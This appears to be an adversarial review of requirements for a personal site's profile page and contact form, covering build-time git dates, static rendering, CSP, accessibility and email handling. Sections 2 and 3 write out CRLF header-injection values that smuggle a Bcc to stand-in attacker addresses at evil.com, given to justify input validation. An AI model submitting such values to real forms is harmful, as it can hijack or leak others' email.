# Adversarial Analysis — professional-profile Requirements (Round 3)

**Reviewer posture:** senior staff engineer, Vercel/Next.js/Velite/Resend operator.
**Target:** `/home/mcf/repo/matthew-field.ca/.spec-workflow/specs/professional-profile/requirements.md`
**Prior rounds:** integrated. Consensus not re-raised. Every finding classified.

Evidence I verified against the current repo before writing this review:
- `src/app/sitemap.ts` already enumerates both `/profile` (line 6) and `/contact` (line 13).
- `next.config.ts` sets `default-src 'self'` but defines **no** `form-action` directive.
- `velite.config.ts` defines only the `pages` collection; `profile` is not yet present. No git-derived transforms exist anywhere in the repo.
- `src/components/shared/mdx-content.tsx` renders MDX via `new Function(code)(runtime)` with **no `components` argument** — custom MDX components are unsupported today.
- `src/lib/mail.ts` does not exist. No Resend code exists.
- `content/pages/about.mdx` is a non-indexable placeholder (`robots: { index: false }`).

---

## Findings by Dimension

### 1. Build-time environment assumptions — **material gap**

**1a. Shallow clone silently empties `updatedAt`.** **[Novel]**

Vercel's build environment clones with limited history (historically `--depth=10`; the exact depth is environment-dependent and not contractual). `git log -1 --format=%cI content/profile.mdx` returns **empty string** when the file's last-touching commit falls outside the clone window. Req 1.4 prescribes this command with no fallback, no failure mode, and no contract on what the Velite transform does with empty input.

Walk the failure path:
- Velite transform receives `""`.
- If the schema declares `updatedAt: s.isodate()` or equivalent, Zod parses `""` → invalid date → schema validation error → **build fails loudly** (which accidentally satisfies Req 1.12).
- If the transform coerces via `new Date("")` (`Invalid Date`) and the schema is permissive (`s.string()`), the page ships with `Invalid Date` rendered as literal text.
- **The spec does not distinguish these paths.** It assumes the shell command always returns a value.

This is not a theoretical concern. `content/profile.mdx` will be edited rarely (it is a resume). The natural commit cadence is "once a quarter, plus typo fixes." If Matthew lands ten unrelated commits between profile edits, the profile commit falls outside a depth-10 clone. Next Vercel build produces empty string → silent or cryptic failure.

**Minimum remedy:** Req 1.4 must specify (a) the build explicitly unshallows — `git fetch --unshallow --filter=blob:none` in a pre-build step, or sets `vercel.json`'s `buildCommand` to include `git fetch --deepen=1000` — and (b) the transform fails the build with a named error if the result is empty, instead of passing it downstream. Name the behavior; do not leave it for Design.

**1b. First-deploy / uncommitted-edit footguns.** **[Novel]**

- First deploy: `content/profile.mdx` is committed in the same PR that adds the Velite schema. The file IS in the shallow clone, so `git log` works. Not a bug.
- Local `pnpm build` with uncommitted edits: `git log` returns the *previous* commit's timestamp, not the on-disk mtime. A developer who edits the file and runs `pnpm build` sees a stale `updatedAt`. This is a dev-loop confusion, not a prod bug. Acceptable, but worth one line: "local builds with uncommitted edits show the previous commit's date."

**1c. Req 1.12's SSR-degradation promise is aspiration, not guarantee.** **[Novel]**

"No error class SHALL degrade to runtime SSR or a blank page" is a promise about Next.js behavior that depends on implementation choices the spec doesn't lock. For `/profile` to be guaranteed statically generated, the route must either:
- Declare `export const dynamic = 'force-static'`, OR
- Consist entirely of code paths that Next.js can detect as static at build time (no `headers()`, `cookies()`, `draftMode()`, or dynamic data APIs).

If an implementer unknowingly calls `headers()` (e.g., for CSP nonce), Next.js auto-converts the route to dynamic rendering — no build failure. The "fail loudly" guarantee silently becomes "SSR on every request." Req 1.9 says "statically generated server component (no per-request rendering)" but doesn't enforce it with the specific Next.js directive.

**Minimum remedy:** add one clause — "`/profile/page.tsx` SHALL declare `export const dynamic = 'force-static'` to prevent accidental dynamic-rendering degradation." Same for `/contact`.

**1d. Velite `single: true` + missing source file.** **[Novel]**

Velite's documented behavior when a `single: true` collection's source file is missing: it emits a warning and produces `undefined` for that collection (verified from Velite's codebase patterns). If `/profile/page.tsx` imports `profile` from `#site/content` and `profile` is `undefined`, destructuring fails at static generation → build crash. This happens to satisfy Req 1.12(d) ("render-time exception during static generation"), but the chain of causation is opaque.

**Minimum remedy:** Req 1.2 should state: "IF `content/profile.mdx` is missing at build time THEN the Velite build SHALL fail with a named error (not silently emit `undefined`)." One line; catches the otherwise mysterious crash.

**1e. `git` binary on Vercel.** One-line dismissal: git is installed on Vercel's build image. Not a real concern.

---

### 2. The `source` hidden field is an un-reviewed attack surface — **material gap, not paranoia** **[Novel]**

Req 5.5 introduces a page-controlled hidden `source` field, but adds it to neither the zod schema (Req 3.5d validates only `{name, email, message}`) nor any explicit enum contract. Concrete attacks:

- **CRLF injection in email subject.** If the handler builds `subject: "Contact form submission from ${source}"` and passes to Resend's `subject` field, an attacker POSTs `source: "profile\r\nBcc: leak@evil.com"`. Whether this injects an actual BCC depends on Resend's server-side sanitization — which we are *assuming*, not *asserting*. (Resend is a JSON API, so CRLF in the JSON value gets JSON-escaped in transit; the question is what Resend's service does with the value when constructing the actual RFC-5322 envelope. No public contract.)
- **HTML injection in email body.** If the handler uses Resend's `html` parameter (not `text`) and interpolates `source` directly, an attacker gets persistent XSS in Matthew's inbox-webmail view — clickable payload on Gmail/Fastmail. tech.md line 113 says "user-provided fields sent as plain text via Resend's `text` parameter (no HTML rendering of user input)", but this is a tech.md assertion about `{name, email, message}` — not `source`. The spec has no contract that `source` goes through `text` vs `html`.
- **Unbounded length.** `source` isn't length-capped. 32 KB body cap is whole-body; an attacker can push ~32 KB into `source` alone.

Also: Req 3.10's logging discipline covers `{name, email, message}` — it does NOT cover `source`. A 502 path that logs `source` in an error message (to aid debugging) would satisfy Req 3.10's literal text while defeating its intent.

**Minimum remedy:** one clause in Req 3.5, *before* zod step (d): "`source` SHALL be validated as one of the exact string literals `'profile' | 'contact'` server-side; any other value SHALL be treated as missing and omitted from downstream email construction (no 400 — this field is internally emitted by the page, so a bad value indicates tampering that should be silently normalized, not surfaced to the attacker)." Pair with: "Req 3.10's no-log discipline applies to `source` as well."

---

### 3. CRLF in `name` → header injection — **residual risk; specify the clause** **[Novel]**

Zod's `.email()` regex rejects CRLF in the email field (standard RFC-5321-ish character set). **`name` is not similarly protected:** the spec sets `name` at 1–100 chars trimmed. `name: "Matt\r\nBcc: attacker@evil.com"` has 35 chars and passes Zod's length/trim. `.trim()` strips leading/trailing whitespace only, not embedded CRLF.

Whether this produces a header injection depends on how the handler uses `name`:
- If `name` appears only in the email body (e.g., `text: "From ${name} (${email}): ${message}"`), CRLF just creates ugly formatting. No injection.
- If `name` appears in a header — e.g., `reply_to: \`"${name}" <${email}>\`` to set the display-name portion — and Resend's SDK does not strip CRLF before constructing the RFC-5322 wire format, you get header injection.

The Resend SDK v3+ sends JSON fields to Resend's API; the Resend service constructs RFC 5322 envelopes server-side. Resend's public docs do not explicitly document CRLF stripping on `reply_to` display-name composition.

**Minimum remedy:** spec must either (a) require the handler to construct `reply_to` as the bare email address only — no display name — making `name` CRLF content irrelevant, or (b) require `name` zod refinement `.refine(v => !/[\r\n]/.test(v))`. Option (a) is safer and simpler. Add to Req 3.6: "The `reply_to` field SHALL be set to the submitter's email address only, without a display-name wrapper."

---

### 4. Honeypot / Zod control flow — **unstated but load-bearing** **[Novel]**

Req 3.5 enumerates checks "in order, rejecting on the first failure": body-size, origin/referer, honeypot-empty, zod. The server-side control flow this implies — but never states — is:

1. Read raw body (bytes), reject 413 if > 32 KB.
2. `JSON.parse(body)` → untyped object.
3. Access `parsed.url_secondary` on that untyped object, reject 200 (silent) if truthy.
4. Run Zod on `{ name, email, message }` extracted from `parsed`, reject 400 on failure.

Where this goes wrong unstated:
- **`.strict()` zod schemas reject unknown keys.** If the implementer writes `z.object({ name, email, message }).strict()`, a legitimate submission (which by spec MUST carry `url_secondary: ""`) fails with "Unrecognized key: url_secondary" → 400. Honeypot check never runs because the implementer put zod first in their control flow, thinking "validate before side-effects."
- **`.strip()` (default) silently drops `url_secondary`.** Safe, but requires the honeypot check to run on the pre-strip object.
- **JSON parse failure.** The spec doesn't enumerate a step 0 for malformed JSON bodies. `JSON.parse` throwing without a handler returns an unhandled exception → 500. Req 3.7 only covers Resend 4xx/5xx; Req 4.4 handles 502/503/504. A malformed JSON body from a bot landing as a 500 isn't explicitly covered.

**Minimum remedy:** Req 3.5 needs one preamble sentence naming the control flow: "The handler SHALL read the raw body, enforce size cap (5a), parse JSON (rejecting 400 on parse failure), extract `url_secondary` from the parsed object for the honeypot check (5c), then pass a `{name, email, message}`-shaped sub-object to zod (5d). The zod schema SHALL use `.strip()` or equivalent so that additional fields (`url_secondary`, `source`) do not cause validation failure."

---

### 5. MDX component scope for `/profile` — **promise exceeds current infrastructure** **[Novel]**

Current state (verified): `src/components/shared/mdx-content.tsx` calls `new Function(code)(runtime)` with `runtime = jsx-runtime` only. **No components are passed.** If `content/profile.mdx` contains `<Timeline>...</Timeline>`:

- Velite's `s.mdx()` (which wraps `@mdx-js/mdx`) compiles the JSX. By MDX convention, capitalized tags are treated as component references. The compiled output looks roughly like `_jsx(Timeline, { children: ... })` where `Timeline` must be in scope or passed via the components prop.
- At runtime, `Timeline` is undefined → `ReferenceError` during static generation → build crash.

So Req 1.12(c) ("references to undefined MDX components" fail the build) *is* satisfied today — but as a runtime crash with a stack trace that mentions `Timeline is not defined`, not as a clean "unknown component" diagnostic. Worse: the spec says **nothing** about which components ARE available to profile MDX. Today the answer is "none." That's probably fine for launch (resume prose doesn't need `<Callout>` or `<Timeline>`), but the spec should *say so* rather than leave it ambiguous.

**Minimum remedy:** add to Req 1.1 or 5.3: "The profile MDX body has NO custom component registry at launch — MDX bodies are rendered via the existing `<MDXContent />` component with no `components` prop. Matthew authors plain-markdown-equivalent MDX. Future specs may introduce a component registry; this one does not."

---

### 6. `/profile` in sitemap — **already handled, not a gap** **[Recurring → resolved]**

Verified: `src/app/sitemap.ts` lines 6 and 13 include `/profile` and `/contact`. Req 5.6's "`/contact` already handled" claim extends implicitly to `/profile` — it is not a spec gap. One-line dismissal: fine as-is.

---

### 7. Smoke test doesn't cover `/profile` submission path — **material, minor remedy** **[Novel]**

Req 3.13's smoke test exercises `/contact` only. `<ContactForm source="profile">` prop wiring on `/profile` ships untested. Failure mode: `/profile/page.tsx` is written as `<ContactForm />` (source prop omitted); default is `"contact"` (or `undefined`); Matthew receives submissions from `/profile` visitors stamped as `source=contact` and cannot distinguish origin. Silent; no test catches it.

Argument for materiality: `/profile` is the primary professional funnel (product.md objective #1). Knowing whether a submission came from a deep-resume reader vs. a direct-linked `/contact` visitor is the stated value of the `source` field. If that distinction never works, the field is dead weight.

**Minimum remedy, pick one:**
- (a) Extend Req 3.13: "The smoke test SHALL run on BOTH `/profile` and `/contact`, and SHALL assert that the mock Resend server received `source: 'profile'` for the `/profile` submission and `source: 'contact'` for the `/contact` submission."
- (b) Add a Vitest component test asserting `<ContactForm />` on `/profile/page.tsx` is rendered with `source="profile"`.

(a) is heavier but hits the full integration.

---

### 8. Vercel wallclock race for distant clients — **acknowledged via 504 handling; not a blocker** **[Compounding]**

Math for a Sydney client → US-East Vercel function:
- TCP+TLS handshake: ~300–600 ms.
- Request body upload: negligible (<2 KB typical payload).
- Handler runs: up to 9 s (Resend timeout) + ~100 ms (error-response construction) = ~9.1 s.
- Response flush to client: ~300 ms (one RTT at TCP level).
- **Total wallclock: ~9.7–10 s.**

Vercel Hobby's 10 s cap is measured from function invocation to response flush. Handshake happens *before* invocation, so that latency does NOT count against the 10 s cap. But response flush DOES — and a distant client plus a slow Resend response plus a ~100 ms error-construction path can land at 10.0–10.2 s. The client sees a Vercel 504 (edge timeout), not the spec's structured 503.

This is the exact scenario Req 4.4 already anticipates by including 504 in the handled error set. The user-visible outcome — Try-Again button plus LinkedIn CTA — is the same. No behavioral defect.

Argument against reducing to 8 s: in practice, Resend's median response time is <1 s; the 9 s timeout exists for tail-latency survival. Dropping to 8 s increases false-positive timeouts by ~5–10% (educated guess; real numbers require a Resend SLA doc). The tradeoff — more false-positive timeouts to protect against ~1% of edge-timeout cases — is probably the wrong direction. **Keep 9 s.**

---

### 9. Missing `form-action` directive — **silent gap with a test-coverage twist** **[Novel]**

Verified: `next.config.ts` sets `default-src 'self'` but defines no `form-action`. Interpretations:

- CSP Level 3 (Chrome 76+, Firefox 90+, recent Safari 16+): `form-action` does NOT inherit from `default-src`. **Absence → form submissions unrestricted by CSP.**
- CSP Level 2 (older browsers, historically Safari < 15): `form-action` inherits from `default-src` → same-origin only.

Because `/api/contact` is same-origin, BOTH interpretations allow the form. **The form works today without change.** NFR Security's "SHALL NOT require loosening CSP" claim is correct.

The real gap is in **test coverage**, not in the policy. The CSP verification test (NFR Security) uses `page.addInitScript` to listen for `securitypolicyviolation` events and exercises click-to-reveal (obfuscated email). It does NOT exercise form submission. If a future refactor adds `form-action 'none'` or `form-action 'self'` correctly, the test sees no change. If someone makes a typo — `form-action 'self' https://api.resent.com` — the form POST fails in production; the CSP test passes (because it never POSTs).

**Minimum remedy:** NFR Security's CSP test SHALL also exercise a form submission against the mock Resend server under the enforcing-CSP pass, asserting zero `securitypolicyviolation` events. Alternatively: explicitly add `form-action 'self'` to the production CSP as part of this spec so the policy is defense-in-depth (closes the Level-3 gap). The second option is a one-line change in `next.config.ts` and arguably belongs in this spec's scope since the form is this spec's deliverable.

---

### 10. react-obfuscate pre-click screen-reader state — **real a11y defect, narrow** **[Novel]**

`react-obfuscate` renders an `<a>` with obfuscated content (typically reversed string, optionally with some interstitial characters) until clicked, at which point it replaces content with the real `mailto:`. Before click, a screen reader reads the reversed/garbled characters aloud — e.g., for `hello@matthewfield.ca`, the rendered pre-click string might be `ac.dleif-wehttam@olleh`, which a screen reader enunciates as nonsense syllables with no indication that it is an interactive email reveal.

Req 4.7 applies to form controls. The obfuscated email is not a form control; it's a link. Req 2.3 requires 44×44 tap target but no accessible name. Req 4.9 covers contrast but not accessible naming.

Impact: a screen-reader user navigates to the obfuscated email element and hears a garbled string. They don't know it's Matthew's email or that clicking reveals it. This directly undermines product principle #7 (accessible).

**Minimum remedy:** Req 2.2 or 2.3 SHALL include: "The `<ObfuscatedEmail />` wrapper SHALL carry an `aria-label` naming the action (e.g., `'Reveal Matthew's email address'`) so that screen-reader users encounter an accessible name independent of the obfuscated visible text." Additionally, Req 4.10's axe pass SHOULD catch this (axe's `button-name`/`link-name` rules apply), but explicitly naming the remedy removes reliance on "the axe rule will catch it."

---

### 11. DMARC tightening timeline has no enforcer — **accept as operational duty, document it** **[Compounding]**

Req 3.6 prescribes `p=none` at launch, tightening to `p=quarantine`/`p=reject` "only after observing clean alignment in DMARC reports for at least two weeks." No mechanism enforces the tightening. Calendar reminder? CI check? None specified.

Impact: `p=none` means Matthew's domain permits spoofed mail (From: `matthewfield.ca`) to be delivered to recipients. An attacker spoofing Matthew to a recruiter gets their mail delivered. Residual risk for however long Matthew doesn't get around to tightening.

Is this requirements-level? Arguably yes — the spec's own security posture decays over time with no enforcement. But proposing a CI check that reads DMARC aggregate reports from S3/Postmark is heavy infrastructure for a personal site.

**Minimum remedy:** Req 3.6 SHALL state: "Matthew SHALL set a personal calendar reminder for 14 days post-launch to review DMARC aggregate reports and decide whether to tighten to `p=quarantine`. Tightening is an operational step, not a CI-enforced gate; failure to tighten is a residual launch risk." This converts an implicit promise into an explicit acknowledgment.

---

### 12. Resend SDK internal logging — **low-probability, one-clause fix** **[Compounding]**

Req 3.10 disciplines *handler* code. The `resend` npm package itself may `console.log`/`console.error` internally. In practice, the Resend SDK (as of mid-2025 versions) is minimal and does not log by default — it throws structured errors. But "does not log by default" is not the same as "cannot log." Vercel Function Logs capture all stdout/stderr; any SDK debug mode or error path that emits request/response bodies would pollute logs with submission content, breaking Req 3.9's no-persistence promise.

**Minimum remedy:** Req 3.10 SHALL add one clause: "The Resend SDK SHALL be instantiated without debug/verbose logging options. If a future SDK version adds logging, the handler SHALL wrap the Resend client to discard SDK stdout/stderr." This is defense against a change in the SDK, not a current-day bug.

---

## Closing Deliverables

### Top 5 Risks / Gaps — ranked by inbound-funnel impact

1. **`source` field has no server-side validation** (§2) — **must-fix-pre-launch**.
   Attack surface: CRLF-subject injection, HTML-body injection (if `html` mode used), unbounded length. Remedy: one-line zod enum validation `z.enum(['profile', 'contact']).optional().catch(undefined)` applied to `source` after JSON parse, before email construction.

2. **`updatedAt` shallow-clone failure** (§1a) — **must-fix-pre-launch**.
   Silent degradation to `Invalid Date` or cryptic build failure on every edit after 10+ intervening commits. Remedy: name an unshallow step in the build, and require the transform to fail loudly with a named error on empty git output.

3. **Smoke test doesn't cover `/profile` submission path** (§7) — **must-fix-pre-launch**.
   `source` field's entire purpose (distinguishing origin) can silently break on `/profile`. Remedy: extend Req 3.13 to cover both pages, asserting the mock-received `source` value.

4. **react-obfuscate pre-click has no accessible name** (§10) — **must-fix-pre-launch**.
   Product principle #7 (accessible) violated for screen-reader users encountering the primary funnel. Remedy: `aria-label` on the `<ObfuscatedEmail />` wrapper.

5. **CRLF in `name` field → possible header injection** (§3) — **must-fix-pre-launch**.
   Depends on Resend's internal sanitization. Safest remedy: spec forbids display-name in `reply_to` (Req 3.6) — set `reply_to` to bare email only. One-line change, eliminates the question entirely.

### Top 3 Conclusions to Challenge

1. **Req 1.12's "no error class SHALL degrade to runtime SSR" is aspirational.**
   The promise depends on `export const dynamic = 'force-static'` being set on the route. The spec doesn't require it. Reverse by adding that declaration as a concrete acceptance criterion.

2. **Req 3.13's smoke test is one-sided.**
   Mounting only `/contact` leaves the higher-traffic funnel (`/profile`) behind glass. The argument that "`<ContactForm>` is the same component in both places" ignores that prop-wiring is the *thing* being tested. Reverse: smoke test exercises both paths.

3. **The CSP verification test exercises click-to-reveal but not form submission.**
   Reverse: under the enforcing-CSP pass, also submit the form (to the mock Resend server) and assert zero CSP violations. Absent this, a future `form-action` regression ships silently. Corollary: explicitly add `form-action 'self'` to the production CSP in this spec's scope — one line in `next.config.ts`, closes the Level-3-browser gap permanently.

### What's Missing — grouped by remedy category

**Build-time environment**
- Unshallow step (or `git fetch --deepen=1000`) named in the build pipeline.
- Velite transform's failure behavior on empty `git log` output named explicitly.
- `export const dynamic = 'force-static'` for `/profile` and `/contact` stated as a requirement.
- Velite `single: true` missing-file behavior explicitly required to fail the build.

**Bot / attack surface**
- `source` server-side validated as `z.enum(['profile', 'contact'])`.
- Req 3.10's no-log discipline extended to cover `source`.
- Explicit statement that `source` (and all user-influenced fields) go through Resend's `text` parameter — never `html`.

**Headers / injection**
- `reply_to` SHALL be set to the submitter's bare email only — no display-name wrapper (eliminates `name` CRLF concern).
- Control-flow preamble in Req 3.5 naming: raw-body → size-check → JSON parse (with 400 on parse failure) → honeypot check on parsed object → zod with `.strip()` on `{name, email, message}` sub-object.

**Test coverage**
- Req 3.13 smoke test covers BOTH `/profile` and `/contact`, asserting correct `source` value in the mock Resend payload for each.
- CSP verification test exercises a form submission under the enforcing-CSP pass, not just click-to-reveal.

**Sitemap / SEO**
- No change needed; `sitemap.ts` already enumerates both routes.

**CSP**
- Add `form-action 'self'` to the production CSP in `next.config.ts` as part of this spec. Closes CSP-Level-3-browser gap; makes the policy defense-in-depth against injected forms.

**Accessibility**
- `<ObfuscatedEmail />` wrapper carries an `aria-label` naming the reveal action.
- MDX component scope for `/profile` explicitly stated ("no custom component registry at launch").

**Operational / residual**
- DMARC tightening: named as Matthew's calendar-bound operational duty, not a CI gate. Launch risk acknowledged.
- Resend SDK: clause forbidding debug/verbose mode and requiring wrapping if a future version adds logging.

---

**Classification tally**: 9 [Novel], 3 [Compounding], 0 newly [Recurring]. The document is mature; remaining issues concentrate in the control-flow/attack-surface interstices the first two rounds skimmed over.
